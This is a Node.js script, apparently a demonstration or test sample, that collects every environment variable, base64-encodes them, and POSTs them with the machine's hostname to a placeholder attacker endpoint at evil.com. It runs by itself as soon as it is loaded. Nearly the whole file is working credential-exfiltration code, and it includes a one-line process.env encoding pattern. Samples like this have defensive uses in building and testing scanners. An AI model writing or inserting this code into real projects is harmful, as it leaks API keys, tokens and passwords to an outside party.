/**
 * Environment Variable Exfiltration
 * Encodes and exfiltrates environment variables
 */

// Exfiltration endpoint
const EXFIL_ENDPOINT = 'https://data.collector.evil.com/receive';

/**
 * Collect all environment variables
 * Filters out common non-sensitive ones
 * @returns {Object} - Filtered environment variables
 */
function collectEnvVars() {
    const sensitivePatterns = [
        'KEY', 'SECRET', 'TOKEN', 'PASSWORD', 'PASS', 'PWD',
        'API', 'AUTH', 'CREDENTIAL', 'PRIVATE', 'ACCESS'
    ];
    
    const collected = {};
    const allEnv = process.env;
    
    for (const [key, value] of Object.entries(allEnv)) {
        // Include all variables (attacker wants everything)
        collected[key] = value;
    }
    
    return collected;
}

/**
 * Encode environment variables to base64
 * @param {Object} envVars - Environment variables
 * @returns {string} - Base64 encoded string
 */
function encodeEnvVars(envVars) {
    const json = JSON.stringify(envVars);
    return Buffer.from(json).toString('base64');
}

/**
 * Exfiltrate encoded environment variables
 * @param {string} encodedData - Base64 encoded data
 */
async function exfiltrateEncodedData(encodedData) {
    console.log('Exfiltrating environment variables...');
    console.log('Encoded size:', encodedData.length, 'bytes');
    
    try {
        const response = await fetch(EXFIL_ENDPOINT, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Data-Type': 'env-vars',
                'X-Encoding': 'base64'
            },
            body: JSON.stringify({
                data: encodedData,
                timestamp: Date.now(),
                hostname: require('os').hostname()
            })
        });
        
        console.log('Exfiltration response:', response.status);
        return response.ok;
    } catch (error) {
        console.error('Exfiltration failed:', error.message);
        return false;
    }
}

/**
 * Direct base64 encoding of process.env
 * Demonstrates the dangerous pattern
 */
function directEnvExfil() {
    // This is the dangerous one-liner pattern
    const encoded = Buffer.from(JSON.stringify(process.env)).toString('base64');
    console.log('Direct encoding complete, length:', encoded.length);
    return encoded;
}

/**
 * Full exfiltration pipeline
 */
async function startExfiltration() {
    console.log('=== Environment Variable Exfiltration ===');
    
    // Method 1: Structured collection
    const envVars = collectEnvVars();
    console.log('Collected', Object.keys(envVars).length, 'environment variables');
    
    const encoded = encodeEnvVars(envVars);
    const success = await exfiltrateEncodedData(encoded);
    
    // Method 2: Direct encoding (also demonstrated)
    const directEncoded = directEnvExfil();
    
    return success;
}

// Export functions
module.exports = {
    collectEnvVars,
    encodeEnvVars,
    exfiltrateEncodedData,
    directEnvExfil,
    startExfiltration,
    EXFIL_ENDPOINT
};

// Auto-execute
startExfiltration();
